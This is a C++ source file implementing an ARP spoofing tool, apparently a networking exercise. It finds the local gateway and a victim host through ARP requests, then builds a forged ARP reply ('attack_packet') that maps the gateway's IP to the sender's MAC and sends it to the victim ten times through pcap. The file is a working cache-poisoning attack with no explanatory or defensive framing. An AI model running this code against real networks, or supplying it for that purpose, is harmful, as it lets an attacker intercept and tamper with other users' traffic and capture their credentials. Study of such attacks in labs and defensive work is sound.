#include "arp.h"

void Arp::setArp()
{
    struct ether_header *eth = (struct ether_header *)(packet);
    struct arp_header *arp = (struct arp_header *)(packet + ETH_HEADER_SIZE);

    uint8_t my_mac[6];
    uint8_t my_ip[4];

    uint8_t victim_mac[6];

    uint8_t gw_mac[6];
    uint8_t gw_ip[4];

    uint8_t subnet[4];

    getMyInfo(subnet, my_ip, my_mac);

    char subnet_str[1024];
    char ip_str[1024];
    char mac_str[1024];

    sprintf(subnet_str, "subnet = %d.%d.%d.%d", subnet[0], subnet[1], subnet[2], subnet[3]);
    sprintf(ip_str, "ip = %d.%d.%d.%d", my_ip[0], my_ip[1], my_ip[2], my_ip[3]);
    sprintf(mac_str, "mac = %02X:%02X:%02X:%02X:%02X:%02X", my_mac[0], my_mac[1], my_mac[2], my_mac[3], my_mac[4], my_mac[5]);

    printf("my interface info\n");
    printf("%s\n%s\n%s\n\n", subnet_str, ip_str, mac_str);

    memcpy(gw_ip, my_ip, 4);

    for (int i = 0; i < 4; i++)
        gw_ip[i] = gw_ip[i] & subnet[i];

    gw_ip[3] += 0b1;

    // make common
    memset(eth->ether_dhost, 0xff, 6);
    memcpy(eth->ether_shost, my_mac, 6);
    eth->ether_type = htons(ETHERTYPE_ARP);

    arp->hw_type = htons(0x0001);
    arp->proto_type = htons(0x0800);
    arp->hlen = 0x06;
    arp->plen = 0x04;

    // make request_packet
    arp->oper = htons(0x0001);
    memcpy(arp->smac, my_mac, 6);
    memcpy(arp->sip, my_ip, 4);
    memset(arp->dmac, 0x00, 6);
    memcpy(arp->dip, gw_ip, 4);

    memcpy(request_packet, packet, 50);

    printf("gateway info\n");
    getTargetInfo(my_mac, gw_ip, gw_mac);
    printf("\n");

    memcpy(arp->dip, victim_ip, 4);
    memcpy(request_packet, packet, 50);

    printf("victim info\n");
    getTargetInfo(my_mac, victim_ip, victim_mac);
    printf("\n");

    // make attack_packet
    arp->oper = htons(0x0002);
    memcpy(eth->ether_dhost, victim_mac, 6);
    memcpy(arp->smac, my_mac, 6);
    memcpy(arp->sip, gw_ip, 4);
    memcpy(arp->dmac, victim_mac, 6);
    memcpy(arp->dip, victim_ip, 4);

    memcpy(attack_packet, packet, 50);

    printf("set arp OK\n");
    sleep(1);
}

void Arp::sendArp()
{
    pcap_t *handle;
    char errbuf[PCAP_ERRBUF_SIZE];

    handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);

    if (handle == NULL)
    {
        printf("pcap open error...\n");
        return;
    }

    for (int i = 0; i < 10; i++)
    {
        if (pcap_sendpacket(handle, attack_packet, ETH_HEADER_SIZE + ARP_HEADER_SIZE) != 0)
        {
            printf("error\n");
        }

        sleep(1);
        printf("send attack arp\n");
    }

    pcap_close(handle);
}

void Arp::getTargetInfo(uint8_t *my_mac, uint8_t *target_ip, uint8_t *target_mac)
{
    pcap_t *handle;
    char errbuf[PCAP_ERRBUF_SIZE];

    handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);

    if (handle == NULL)
    {
        printf("pcap open error...\n");
        return;
    }

    if (pcap_sendpacket(handle, request_packet, ETH_HEADER_SIZE + ARP_HEADER_SIZE) != 0)
    {
        printf("error\n");
    }

    while (true)
    {
        struct pcap_pkthdr *header;
        const u_char *temp;
        int res = pcap_next_ex(handle, &header, &temp);

        if (res == 0)
            continue;
        if (res == -1 || res == -2)
            break;

        struct ether_header *eth = (struct ether_header *)(temp);
        if (eth->ether_type != htons(ETHERTYPE_ARP))
            continue;
        struct arp_header *arp = (struct arp_header *)(temp + ETH_HEADER_SIZE);
        if (arp->oper != ntohs(0x0002))
            continue;
        if (memcmp(arp->dmac, my_mac, 6) != 0)
            continue;

        printf("ip = %d.%d.%d.%d\n", arp->sip[0], arp->sip[1], arp->sip[2], arp->sip[3]);
        printf("mac = %02X:%02X:%02X:%02X:%02X:%02X\n", arp->smac[0], arp->smac[1], arp->smac[2], arp->smac[3], arp->smac[4], arp->smac[5]);
        memcpy(target_ip, arp->sip, 4);
        memcpy(target_mac, arp->smac, 6);
        break;
    }

    pcap_close(handle);
}

void Arp::getMyInfo(uint8_t *subnet, uint8_t *ip, uint8_t *mac)
{

    /*        Get my IP Address      */
    int fd;
    struct ifreq ifr;

    fd = socket(AF_INET, SOCK_DGRAM, 0);

    ifr.ifr_addr.sa_family = AF_INET;

    strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);

    ioctl(fd, SIOCGIFNETMASK, &ifr);

    memcpy(subnet, &((((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr).s_addr), 4);

    ioctl(fd, SIOCGIFADDR, &ifr);

    memcpy(ip, &((((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr).s_addr), 4);

    close(fd);

    /*************************************************************************************************/

    /*        Get my Mac Address      */

    int mib[6];
    size_t len;
    char *buf;
    unsigned char *ptr;
    struct if_msghdr *ifm;
    struct sockaddr_dl *sdl;

    mib[0] = CTL_NET;
    mib[1] = AF_ROUTE;
    mib[2] = 0;
    mib[3] = AF_LINK;
    mib[4] = NET_RT_IFLIST;
    if ((mib[5] = if_nametoindex(dev)) == 0)
    {
        perror("if_nametoindex error");
        exit(2);
    }

    if (sysctl(mib, 6, NULL, &len, NULL, 0) < 0)
    {
        perror("sysctl 1 error");
        exit(3);
    }

    if ((buf = (char *)malloc(len)) == NULL)
    {
        perror("malloc error");
        exit(4);
    }

    if (sysctl(mib, 6, buf, &len, NULL, 0) < 0)
    {
        perror("sysctl 2 error");
        exit(5);
    }

    ifm = (struct if_msghdr *)buf;
    sdl = (struct sockaddr_dl *)(ifm + 1);
    ptr = (unsigned char *)LLADDR(sdl);

    memcpy(mac, ptr, 6);
}
